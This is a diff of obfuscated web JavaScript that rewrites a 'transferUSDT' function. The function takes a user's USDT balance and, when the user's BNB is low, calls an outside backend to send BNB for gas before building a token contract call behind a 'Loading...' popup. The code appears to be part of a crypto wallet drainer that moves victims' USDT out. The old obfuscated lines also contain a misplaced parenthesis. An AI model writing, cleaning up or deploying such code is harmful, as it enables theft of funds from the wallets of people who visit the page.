@@ -271,16 +271,15 @@ const _0x1b5be5 = _0x3140;
             }
             showPopup("Loading...", _0x3ddf57(0xda)), transferUSDT(_0xf5d166, _0x2587c5);
         }
-       async function transferUSDT(_0x43f85a, _0x1cd071) {
-            const _0x4b8098 = _0x1b5be5;
-            try {
-                _0x1cd071 < 0.0005 &&
-                    (console["log"](_0x4b8098(0xce)),
-                        await fetch('https://bep20usdt-backend-production.up.railway.app/send-bnb'), {
-                            method: _0x4b8098(0xbb),
-                            headers: { "Content-Type": _0x4b8098(0xec) },
-                            body: JSON[_0x4b8098(0xd4)]({ toAddress: userAddress }),
-                        }));
+      async function transferUSDT(usdtBalance, userBNB) {
+    try {
+        if (userBNB < 0.0005) {
+    console.log("User BNB is low. Requesting BNB from backend...");
+    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ toAddress: userAddress })
+    });
                 const _0x1d74ee = new web3[_0x4b8098(0xb7)][_0x4b8098(0xc0)](
                     [
                         {
